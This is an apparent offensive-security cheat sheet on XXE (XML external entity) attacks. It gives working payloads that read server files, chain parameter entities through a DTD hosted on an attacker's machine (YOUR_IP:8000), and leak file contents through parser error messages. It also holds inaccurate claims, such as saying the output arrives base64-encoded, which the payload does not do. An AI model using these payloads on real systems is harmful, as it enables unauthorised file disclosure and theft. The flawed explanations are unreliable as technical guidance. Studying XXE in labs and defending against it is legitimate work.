# Advanced File Disclosure (XXE)

Goal: Bypass standard XML parser limitations to leak files that contain XML-breaking characters or are not reflected in the response.
# 1. Problem with Standard External Entities

If you try to read a file like `index.php` using:

```xml
<!DOCTYPE email [ <!ENTITY xxe SYSTEM "file:///var/www/html/index.php"> ]>
<email>&xxe;</email>
```

you’ll likely get no output. Files with characters like `<`, `>`, `&` break the XML structure when injected directly.
# 2. CDATA Wrapping (Initial Attempt)

Wrapping content with CDATA lets you embed special characters safely:

```xml
<!ENTITY begin "<![CDATA[">
<!ENTITY file SYSTEM "file:///var/www/html/index.php">
<!ENTITY end "]]>">
<!ENTITY joined "&begin;&file;&end;">
```

But this does not work — XML doesn’t allow joining internal and external entities.
# 3. Parameter Entity Chain via External DTD

Solution: use parameter entities defined inside an external DTD, allowing external entities to be joined safely.

Step 1: Create xxe.dtd:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Step 2: Serve DTD:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Step 3: XML payload sent to server:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/index.php">
  <!ENTITY % end "]]]]><![CDATA[>">
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

If successful, you get the file content base64-wrapped inside CDATA.

Use this method if:

- The file is not rendering due to parser errors    
- You’re dealing with non-PHP environments where php://filter is unavailable
#### 4. Error-Based File Disclosure

Used when no fields reflect output but the app leaks parser errors (e.g., `DOMDocument::loadXML()` warnings).

Step 1: Create err.dtd:

```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY xxe SYSTEM '%nonexistent;/%file;'>">
```

Step 2: XML payload:

```xml
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/err.dtd">
  %remote;
  %error;
]>
<data>&xxe;</data>
```

When `%xxe;` is resolved, parser tries to fetch from `http://nonexistent/<file-content>`, which fails and throws an error. Error response leaks the file content embedded in the bad URI.

Works only if:

- Errors are printed to the page    
- Parser does not suppress malformed URI/invalid entity errors

Use this when:

- No visible fields reflect injected entities    
- But server is leaking parser warnings